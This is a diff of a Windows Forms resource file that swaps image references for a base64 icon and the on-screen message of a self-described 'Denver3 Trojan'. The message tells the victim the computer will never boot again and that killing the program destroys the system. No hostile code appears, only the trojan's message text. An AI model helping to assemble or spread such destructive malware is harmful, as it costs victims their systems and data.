@@ -117,38 +117,83 @@
   <resheader name="writer">
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
-  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
-  <data name="images (1)" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\images (1).jfif;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="RichTextBox1.Text" xml:space="preserve">
+    <value>YOUR COMUTER HAS BEEN DERTORYED BY THE DENVER3 TROJAN
+
+Your computer won't boot up again,
+so use it as long as you can!
+
+:D
+
+Trying to kill Denver3 Will cause your system to be
+destriyed instantly, so don't try it :D
+
+I think we both had a fun time here and it's time for me to go goodbye - Denver3 &amp; Yuki3.
+
+Trojan made by zv8001 aka zv800 
+github: https://github.com/zv8001
+youtube: https://www.youtube.com/c/Core533
+
+
+
+</value>
   </data>
-  <data name="noFilter" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\noFilter.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="creepy-irl-patrick-sponge-bob-wtf-4814665472" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\creepy-irl-patrick-sponge-bob-wtf-4814665472.jfif;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="242406" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\242406.jpg;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="images" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\images.jpg;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="noFilter1" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\noFilter1.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="tumblr_016e08a0519172f53be9e62d1b2575f9_e6e2a25f_1280" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\tumblr_016e08a0519172f53be9e62d1b2575f9_e6e2a25f_1280.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="Bill_Nye_the_Science_Guy_title_screen" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Bill_Nye_the_Science_Guy_title_screen.jpg;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="Half-Life_2_cover" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Half-Life_2_cover.jpg;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="images1" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\images.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="error-defect-warning-icon-isolated-on-white-background-free-vector" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\error-defect-warning-icon-isolated-on-white-background-free-vector.jpg;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <assembly alias="System.Drawing" name="System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+  <data name="$this.Icon" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+    <value>
+        AAABAAEAFyAAAAEAIAAoDAAAFgAAACgAAAAXAAAAQAAAAAEAIAAAAAAAgAsAAMMOAADDDgAAAAAAAAAA
+        AAAjIyP/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIi
+        Iv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/wEBAf8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AQEB/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8BAQH/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wEBAf8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wEBAf8EBAT/BwcH/wkJ
+        Cf8ODg7/AQEB/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AQEB/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/KSkp/21tbf+IiIj/hoaG/5GQkf8zMzP/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8BAQH/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AwMD/yoqKv+RkZH/vb29/6en
+        p/+kpKT/wMDA/5+fn/8hISH/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wEBAf8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wMDA/8oKCj/hISE/729vf+Ojo7/RkZG/1NTU/+dnZ3/u7u7/39/f/8mJib/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/AQEB/wAAAP8AAAD/AAAA/wAAAP8AAAD/CwsL/0JCQv+Kior/gICA/2Nj
+        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
+        Iv8BAQH/AAAA/wAAAP8AAAD/AAAA/wAAAP8BAQH/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wQE
+        BP8UFBT/TU1N/4eHh/+QkJD/Xl5e/yQkJP8DAwP/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wEB
+        Af8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AQEB/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8BAQH/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wICAv8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAA
+        AP8AAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+        AAAAAAAAAAAAAAAAAAA=
+</value>
   </data>
 </root>
